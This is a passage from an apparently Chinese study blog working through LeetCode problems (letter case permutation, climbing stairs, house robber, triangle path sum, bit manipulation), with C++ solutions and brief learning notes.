class="keyword">if</span>(isSmall(s[i]))&#123;</span><br><span class="line">                now.push_back(s[i]-(<span class="string">'a'</span>-<span class="string">'A'</span>));</span><br><span class="line">                dfs(now,s,i+<span class="number">1</span>);</span><br><span class="line">                now.pop_back();</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(isBig(s[i]))&#123;</span><br><span class="line">                now.push_back(s[i]+(<span class="string">'a'</span>-<span class="string">'A'</span>));</span><br><span class="line">                dfs(now,s,i+<span class="number">1</span>);</span><br><span class="line">                now.pop_back();</span><br><span class="line">            &#125;now.push_back(s[i]);</span><br><span class="line">            dfs(now,s,i+<span class="number">1</span>);</span><br><span class="line">            now.pop_back();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; <span class="title">letterCasePermutation</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> now;<span class="comment">//now是当前完成的字符串，s是原始串</span></span><br><span class="line">        dfs(now,s,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>递归的位运算</p>
<p><img src="/2021/08/26/00-03/image-20210822153225929.png" alt="image-20210822153225929"></p>
<p>大小A差距32，所以异或32即可</p>
<p>A的32位为0，不同为1，就加上32了</p>
<p>a的32位位1，相同为0，就减去32了</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="built_in">string</span> s,<span class="keyword">int</span> n,<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&amp; res)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(s.<span class="built_in">size</span>() == n) <span class="keyword">return</span> res.push_back(s);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isdigit</span>(s[n])) <span class="keyword">return</span> dfs(s,n+<span class="number">1</span>,res);</span><br><span class="line">        dfs(s,n+<span class="number">1</span>,res);</span><br><span class="line">        s[n] ^= (<span class="number">1</span>&lt;&lt;<span class="number">5</span>);</span><br><span class="line">        dfs(s,n+<span class="number">1</span>,res);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; <span class="title">letterCasePermutation</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; res;</span><br><span class="line">        dfs(s,<span class="number">0</span>,res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>非递归</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; <span class="title">letterCasePermutation</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; result&#123;s&#125;;</span><br><span class="line">        <span class="keyword">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;<span class="comment">//循环每个字符</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">isupper</span>(s[i]))&#123;<span class="comment">//当前字符为大写</span></span><br><span class="line">                <span class="keyword">int</span> <span class="built_in">size</span> = result.<span class="built_in">size</span>();</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="built_in">size</span>;j++)&#123;<span class="comment">//当原来所有的字符串，改位置改为小写</span></span><br><span class="line">                    <span class="built_in">string</span> temp = result[j];</span><br><span class="line">                    temp[i] = <span class="built_in">tolower</span>(temp[i]);</span><br><span class="line">                    result.emplace_back(temp);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">islower</span>(s[i]))&#123;</span><br><span class="line">                <span class="keyword">int</span> <span class="built_in">size</span> = result.<span class="built_in">size</span>();</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="built_in">size</span>;j++)&#123;</span><br><span class="line">                    <span class="built_in">string</span> temp = result[j];</span><br><span class="line">                    temp[i] = <span class="built_in">toupper</span>(temp[i]);</span><br><span class="line">                    result.emplace_back(temp);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1 id="第-12-天-动态规划"><a href="#第-12-天-动态规划" class="headerlink" title="第 12 天 动态规划"></a>第 12 天 动态规划</h1><h3 id="70-爬楼梯"><a href="#70-爬楼梯" class="headerlink" title="70. 爬楼梯"></a><a href="https://leetcode-cn.com/problems/climbing-stairs/" target="_blank" rel="noopener">70. 爬楼梯</a></h3><blockquote>
<p>动态规划</p>
</blockquote>
<p>f(x)=f(x−1)+f(x−2)</p>
<p>「滚动数组思想」把空间复杂度优化成 O(1)</p>
<p><img src="/2021/08/26/00-03/70_fig1.gif" alt="fig1"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">climbStairs</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> p=<span class="number">0</span>,q=<span class="number">0</span>,r=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            p=q;</span><br><span class="line">            q=r;</span><br><span class="line">            r=p+q;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>矩阵快速幂</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">long</span> <span class="keyword">long</span>&gt;&gt; <span class="title">multiply</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">long</span> <span class="keyword">long</span>&gt;&gt;&amp;a,<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">long</span> <span class="keyword">long</span>&gt;&gt; &amp;b)</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">long</span> <span class="keyword">long</span>&gt;&gt; <span class="title">c</span><span class="params">(<span class="number">2</span>,<span class="built_in">vector</span>&lt;<span class="keyword">long</span> <span class="keyword">long</span>&gt;(<span class="number">2</span>))</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">2</span>;j++)&#123;</span><br><span class="line">                c[i][j] = a[i][<span class="number">0</span>]*b[<span class="number">0</span>][j] + a[i][<span class="number">1</span>]*b[<span class="number">1</span>][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">long</span> <span class="keyword">long</span>&gt;&gt; <span class="title">matrixPow</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">long</span> <span class="keyword">long</span>&gt;&gt; a,<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">long</span> <span class="keyword">long</span>&gt;&gt; ret = &#123;&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">1</span>&#125;&#125;;<span class="comment">//初始为单位矩阵</span></span><br><span class="line">        <span class="keyword">while</span>(n&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(n&amp;<span class="number">1</span> == <span class="number">1</span>)&#123;</span><br><span class="line">                ret = multiply(ret,a);<span class="comment">//每次积累</span></span><br><span class="line">            &#125;</span><br><span class="line">            n&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">            a=multiply(a,a);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">climbStairs</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">long</span> <span class="keyword">long</span>&gt;&gt; ret = &#123;&#123;<span class="number">1</span>,<span class="number">1</span>&#125;,&#123;<span class="number">1</span>,<span class="number">0</span>&#125;&#125;;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">long</span> <span class="keyword">long</span>&gt;&gt; res = matrixPow(ret,n);</span><br><span class="line">        <span class="keyword">return</span> res[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>通向公式，数学yyds</p>
<p><img src="/2021/08/26/00-03/image-20210826002323668.png" alt="image-20210826002323668"></p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">climbStairs</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">double</span> sqrt5 = <span class="built_in">sqrt</span>(<span class="number">5</span>);</span><br><span class="line">        <span class="keyword">double</span> fibn = <span class="built_in">pow</span>((<span class="number">1</span>+sqrt5)/<span class="number">2</span>,n+<span class="number">1</span>) - <span class="built_in">pow</span>((<span class="number">1</span>-sqrt5)/<span class="number">2</span>,n+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> round(fibn/sqrt5);<span class="comment">//round:四舍五入</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="198-打家劫舍"><a href="#198-打家劫舍" class="headerlink" title="198. 打家劫舍"></a><a href="https://leetcode-cn.com/problems/house-robber/" target="_blank" rel="noopener">198. 打家劫舍</a></h3><blockquote>
<p>最简单的动态规划</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">rob</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums.empty())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> <span class="built_in">size</span> = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">size</span>==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; dp = <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;(<span class="built_in">size</span>,<span class="number">0</span>);</span><br><span class="line">        dp[<span class="number">0</span>] = nums[<span class="number">0</span>];</span><br><span class="line">        dp[<span class="number">1</span>] = <span class="built_in">max</span>(nums[<span class="number">0</span>],nums[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;<span class="built_in">size</span>;i++)&#123;</span><br><span class="line">            dp[i] = <span class="built_in">max</span>(dp[i<span class="number">-2</span>]+nums[i],dp[i<span class="number">-1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[<span class="built_in">size</span><span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>类似于滚动数组</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">rob</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums.empty())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> <span class="built_in">size</span> = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">size</span>==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> first = nums[<span class="number">0</span>],second = <span class="built_in">max</span>(nums[<span class="number">0</span>],nums[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;<span class="built_in">size</span>;i++)&#123;<span class="comment">//三个分别是：first、second、max</span></span><br><span class="line">            <span class="keyword">int</span> temp = second;</span><br><span class="line">            second = <span class="built_in">max</span>(first+nums[i],second);</span><br><span class="line">            first = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> second;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="120-三角形最小路径和"><a href="#120-三角形最小路径和" class="headerlink" title="120. 三角形最小路径和"></a><a href="https://leetcode-cn.com/problems/triangle/" target="_blank" rel="noopener">120. 三角形最小路径和</a></h3><blockquote>
<p>枚举所有情况</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minimumTotal</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; triangle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = triangle.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">f</span><span class="params">(n,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;(n))</span></span>;</span><br><span class="line">        f[<span class="number">0</span>][<span class="number">0</span>] = triangle[<span class="number">0</span>][<span class="number">0</span>];<span class="comment">//最左边的情况</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;<span class="comment">//中间</span></span><br><span class="line">            f[i][<span class="number">0</span>] = f[i<span class="number">-1</span>][<span class="number">0</span>]+triangle[i][<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;i;j++)&#123;</span><br><span class="line">                f[i][j] = <span class="built_in">min</span>(f[i<span class="number">-1</span>][j<span class="number">-1</span>],f[i<span class="number">-1</span>][j])+triangle[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">            f[i][i] = f[i<span class="number">-1</span>][i<span class="number">-1</span>]+triangle[i][i];<span class="comment">//最右边</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> *min_element(f[n<span class="number">-1</span>].<span class="built_in">begin</span>(),f[n<span class="number">-1</span>].<span class="built_in">end</span>());<span class="comment">//min_element取容器中的最小值，*取的是二维数组中取出来的一维数组的值</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>空间复杂度的优化</p>
<p>用两个长度为n的数组代替n*n的数组</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minimumTotal</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; triangle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = triangle.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">f</span><span class="params">(<span class="number">2</span>,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;(n))</span></span>;<span class="comment">//2n的空间</span></span><br><span class="line">        f[<span class="number">0</span>][<span class="number">0</span>] = triangle[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> curr = i%<span class="number">2</span>;<span class="comment">//第一个n</span></span><br><span class="line">            <span class="keyword">int</span> prev = <span class="number">1</span>-curr;<span class="comment">//第二个n，实现交替0 1，1 0</span></span><br><span class="line">            f[curr][<span class="number">0</span>] = f[prev][<span class="number">0</span>] + triangle[i][<span class="number">0</span>];<span class="comment">//当前值还是用i，保存的地址是curr和prev</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;i;j++)&#123;</span><br><span class="line">                f[curr][j] = <span class="built_in">min</span>(f[prev][j<span class="number">-1</span>],f[prev][j])+triangle[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">            f[curr][i] = f[prev][i<span class="number">-1</span>]+triangle[i][i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> *min_element(f[(n<span class="number">-1</span>)%<span class="number">2</span>].<span class="built_in">begin</span>(),f[(n<span class="number">-1</span>)%<span class="number">2</span>].<span class="built_in">end</span>());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;<span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minimumTotal</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; triangle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = triangle.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">f</span><span class="params">(<span class="number">2</span>,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;(n))</span></span>;<span class="comment">//2n的空间</span></span><br><span class="line">        f[<span class="number">0</span>][<span class="number">0</span>] = triangle[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> curr = i%<span class="number">2</span>;<span class="comment">//第一个n</span></span><br><span class="line">            <span class="keyword">int</span> prev = <span class="number">1</span>-curr;<span class="comment">//第二个n，实现交替0 1，1 0</span></span><br><span class="line">            f[curr][<span class="number">0</span>] = f[prev][<span class="number">0</span>] + triangle[i][<span class="number">0</span>];<span class="comment">//当前值还是用i，保存的地址是curr和prev</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;i;j++)&#123;</span><br><span class="line">                f[curr][j] = <span class="built_in">min</span>(f[prev][j<span class="number">-1</span>],f[prev][j])+triangle[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">            f[curr][i] = f[prev][i<span class="number">-1</span>]+triangle[i][i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> *min_element(f[(n<span class="number">-1</span>)%<span class="number">2</span>].<span class="built_in">begin</span>(),f[(n<span class="number">-1</span>)%<span class="number">2</span>].<span class="built_in">end</span>());<span class="comment">//f[(n-1)%2:最后一行的结果</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>空间复杂度n的优化，不过没太看懂，就一点点感觉那种</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minimumTotal</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; triangle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = triangle.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">f</span><span class="params">(n)</span></span>;</span><br><span class="line">        f[<span class="number">0</span>] = triangle[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            f[i] = f[i<span class="number">-1</span>] + triangle[i][i];</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i<span class="number">-1</span>;j&gt;<span class="number">0</span>;j--)&#123;</span><br><span class="line">                f[j] = <span class="built_in">min</span>(f[j<span class="number">-1</span>],f[j])+triangle[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">            f[<span class="number">0</span>] += triangle[i][<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> *min_element(f.<span class="built_in">begin</span>(),f.<span class="built_in">end</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1 id="第-13-天-位运算"><a href="#第-13-天-位运算" class="headerlink" title="第 13 天 位运算"></a>第 13 天 位运算</h1><h3 id="231-2-的幂"><a href="#231-2-的幂" class="headerlink" title="231. 2 的幂"></a><a href="https://leetcode-cn.com/problems/power-of-two/" target="_blank" rel="noopener">231. 2 的幂</a></h3><blockquote>
<p>根据位运算的特点得到两个公式</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isPowerOfTwo</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> n&gt;<span class="number">0</span> &amp;&amp; (n&amp;(n<span class="number">-1</span>)) == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isPowerOfTwo</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> n&gt;<span class="number">0</span> &amp;&amp; (n&amp;(-n)) == n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>如果事最大的2幂次的约数，那么就是了。interesting</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">constexpr</span> <span class="keyword">int</span> BIG = <span class="number">1</span>&lt;&lt;<span class="number">30</span>;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isPowerOfTwo</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> n&gt;<span class="number">0</span> &amp;&amp; BIG % n == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="191-位1的个数"><a href="#191-位1的个数" class="headerlink" title="191. 位1的个数"></a><a href="https://leetcode-cn.com/problems/number-of-1-bits/" target="_blank" rel="noopener">191. 位1的个数</a></h3><blockquote>
<p>正常的简答逻辑</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">hammingWeight</span><span class="params">(<span class="keyword">uint32_t</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ret=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(n&amp;(<span class="number">1</span>&lt;&lt;i))&#123;</span><br><span class="line">                ret++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>效率比之前的好，每次把最后一个1位置零</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">hammingWeight</span><span class="params">(<span class="keyword">uint32_t</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ret=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(n)&#123;</span><br><span class="line">            n&amp;=n<span class="number">-1</span>;</span><br><span class="line">            ret++;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1 id="第-14-天-位运算"><a href="#第-14-天-位运算" class="headerlink" title="第 14 天 位运算"></a>第 14 天 位运算</h1><h3 id="190-颠倒二进制位"><a href="#190-颠倒二进制位" class="headerlink" title="190. 颠倒二进制位"></a><a href="https://leetcode-cn.com/problems/reverse-bits/" target="_blank" rel="noopener">190. 颠倒二进制位</a></h3><blockquote>
<p>rev存的是结果，一开始是全0，将数n依次从前头的1与到rev里面。</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">uint32_t</span> <span class="title">reverseBits</span><span class="params">(<span class="keyword">uint32_t</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">uint32_t</span> rev=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span> &amp;&amp; n&gt;<span class="number">0</span>;++i)&#123;</span><br><span class="line">            rev |= (n&amp;<span class="number">1</span>) &lt;&lt; (<span class="number">31</span>-i);</span><br><span class="line">            n&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> rev;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>高级，没太看懂，大概意思就是每次分治，先2位交换，逐步扩展到最后</p>
</blockquote>
